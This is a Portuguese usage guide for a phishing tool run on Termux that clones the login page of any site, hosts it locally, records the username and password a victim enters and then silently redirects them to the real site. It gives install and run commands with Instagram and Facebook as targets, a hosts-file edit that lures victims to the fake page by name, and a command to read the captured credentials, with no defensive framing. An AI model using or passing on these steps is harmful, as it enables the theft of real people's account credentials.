# PHISH - Guia de Uso

## O que faz:
1. Clona a página de login de qualquer site
2. Hospeda localmente no Termux
3. Quando a pessoa digita usuário e senha, salva os dados
4. Redireciona pro site original (a pessoa nem percebe)

## Requisitos:
- Termux (sem root)
- Node.js (o script instala automaticamente)

## Instalação:
```bash
git clone https://github.com/tafasad/phishing-local.git
cd phishing-local && chmod +x phish && ./phish
```

## Aliás (opcional, pra chamar só `phish`):
```bash
echo 'export PATH="$PATH:$HOME/phishing-local"' >> ~/.bashrc && source ~/.bashrc
```

Depois é só digitar: `phish`

## Método direto:
```bash
./phish https://instagram.com https://instagram.com
```

## Com porta customizada:
```bash
./phish https://facebook.com https://facebook.com 9090
```

## Fazer a pessoa acessar pelo nome (opcional):

No Windows (notebook/PC), abra como admin:
```
notepad C:\Windows\System32\drivers\etc\hosts
```

Adicione:
```
SEU_IP_TERMUX    instagram.local
```

Exemplo:
```
192.168.1.5    instagram.local
```

Agora a pessoa digita no navegador: `http://instagram.local:8080`

## Ver capturas:
```bash
cat ~/phishing-local/captured.txt
```

## Fluxo:
```bash
1. Você roda: phish (ou ./phish)
2. Script baixa o HTML/CSS do site
3. Servidor local inicia na porta 8080
4. Você pega o IP do Termux: http://SEU_IP:8080
5. A pessoa acessa e digita login
6. Você captura os dados
7. Ela é redirecionada pro site original
```
